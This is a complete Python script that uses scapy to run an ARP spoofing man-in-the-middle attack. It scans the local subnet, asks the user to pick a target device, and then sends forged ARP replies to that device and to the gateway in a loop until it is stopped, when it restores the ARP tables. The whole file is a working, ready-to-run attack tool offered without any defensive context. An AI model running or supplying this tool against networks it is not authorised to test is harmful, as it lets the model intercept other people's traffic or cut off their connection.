import os
import time
import socket
from scapy.all import ARP, Ether, send, srp, conf
from colorama import Fore, Style, init

init(autoreset=True)

def get_mac(ip_address):
    """Get MAC address from IP using ARP request"""
    arp_request = ARP(pdst=ip_address)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered:
        return answered[0][1].hwsrc
    return None

def scan_network(router_ip):
    """Scan the subnet for active devices"""
    print(f"{Fore.CYAN}\n[+] Scanning network for connected devices...{Style.RESET_ALL}")
    arp = ARP(pdst=f"{router_ip}/24")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    devices = []
    answered, _ = srp(packet, timeout=3, verbose=0)

    for sent, received in answered:
        devices.append({"ip": received.psrc, "mac": received.hwsrc})

    return devices

def spoof(target_ip, spoof_ip, target_mac):
    """Send spoofed ARP response to target_ip"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip, destination_mac, source_mac):
    """Restore the normal ARP mapping"""
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

def start_arp_spoofing():
    if os.geteuid() != 0:
        print(f"{Fore.RED}This script requires root privileges. Please run with sudo.{Style.RESET_ALL}")
        return

    router_ip = input(f"{Fore.YELLOW}Enter your Router IP (Gateway): {Style.RESET_ALL}")

    # Validate IP format
    try:
        socket.inet_aton(router_ip)
    except socket.error:
        print(f"{Fore.RED}Invalid IP address format.{Style.RESET_ALL}")
        return

    devices = scan_network(router_ip)
    if not devices:
        print(f"{Fore.RED}No devices found on the network.{Style.RESET_ALL}")
        return

    print(f"{Fore.GREEN}Devices found on the network:{Style.RESET_ALL}")
    for idx, device in enumerate(devices, 1):
        print(f"{Fore.YELLOW}[{idx}] IP: {device['ip']}, MAC: {device['mac']}{Style.RESET_ALL}")

    try:
        choice = int(input(f"{Fore.YELLOW}Select target device by number: {Style.RESET_ALL}"))
        if choice < 1 or choice > len(devices):
            print(f"{Fore.RED}Invalid choice.{Style.RESET_ALL}")
            return
    except ValueError:
        print(f"{Fore.RED}Invalid input.{Style.RESET_ALL}")
        return

    target_ip = devices[choice-1]['ip']
    target_mac = devices[choice-1]['mac']
    gateway_ip = router_ip
    gateway_mac = get_mac(gateway_ip)

    if not gateway_mac:
        print(f"{Fore.RED}Could not find gateway MAC address. Exiting.{Style.RESET_ALL}")
        return

    print(f"\n{Fore.GREEN}Starting ARP spoofing attack on {target_ip}... Press Ctrl+C to stop.{Style.RESET_ALL}")

    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n{Fore.GREEN}Restoring ARP tables...{Style.RESET_ALL}")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        print(f"{Fore.GREEN}ARP tables restored. Exiting.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    start_arp_spoofing()
